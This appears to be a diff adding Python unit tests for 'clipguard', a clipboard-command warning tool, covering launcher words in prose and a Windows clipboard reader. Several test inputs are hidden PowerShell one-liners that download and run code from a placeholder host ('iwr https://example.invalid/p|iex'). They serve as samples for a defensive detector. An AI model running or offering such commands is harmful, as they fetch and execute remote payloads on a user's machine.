@@ -310,3 +310,54 @@ class TestTheCliVerb(unittest.TestCase):
 
 if __name__ == "__main__":
     unittest.main()
+
+
+class TestLaunchersInProse(unittest.TestCase):
+    """A launcher word in a sentence is not a command. Before this, prose with
+    a URL and the word "start" in it earned a notice."""
+
+    def test_prose_naming_launchers_matches_nothing(self):
+        for text in (
+            "Open cmd and start https://example.com/setup to begin; it downloads the installer.",
+            "In PowerShell, iex runs a string as code; see https://example.com/docs before using it.",
+            "The mshta binary lives in System32; see https://example.com/lolbins for the list.",
+        ):
+            self.assertIsNone(clipguard.classify(text), text)
+
+    def test_a_launcher_reached_through_a_path_quote_or_handoff_still_counts(self):
+        for text in (
+            '"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" -w hidden -c "iwr https://example.invalid/p|iex"',
+            'start powershell -w hidden -c "iwr https://example.invalid/s|iex"',
+            'cmd /c powershell -w hidden -c "iwr https://example.invalid/c|iex"',
+            '  powershell -w hidden -c "iwr https://example.invalid/w|iex"',
+        ):
+            m = clipguard.classify(text)
+            self.assertIsNotNone(m, text)
+            self.assertEqual(m.tier, WARNING, text)
+
+
+@unittest.skipUnless(sys.platform == "win32", "the clipboard reader is Windows-only")
+class TestTheRealClipboard(unittest.TestCase):
+    """On the Windows runner, which has a desktop: the ctypes reader binds,
+    polls and reads without raising. The first version referenced
+    ctypes.wintypes without importing it and every other test stayed green."""
+
+    def test_the_reader_binds_polls_and_reads(self):
+        source = clipguard.WindowsClipboard()
+        self.assertTrue(source.available)
+        self.assertGreaterEqual(source.sequence(), 0)
+        try:
+            clip = source.read()
+        except clipguard.ClipboardBusy as exc:
+            self.skipTest(f"the clipboard is held by another program: {exc}")
+        self.assertTrue(clip is None or isinstance(clip, clipguard.ClipText))
+        owner = source._owner()
+        self.assertTrue(owner is None or isinstance(owner, str))
+
+    def test_the_sequence_number_cost_is_printed(self):
+        import timeit
+        source = clipguard.WindowsClipboard()
+        n = 100_000
+        per_call = timeit.timeit(source.sequence, number=n) / n * 1e6
+        print(f"\n  GetClipboardSequenceNumber: {per_call:.2f} us per call over {n:,}")
+        self.assertLess(per_call, 50.0)
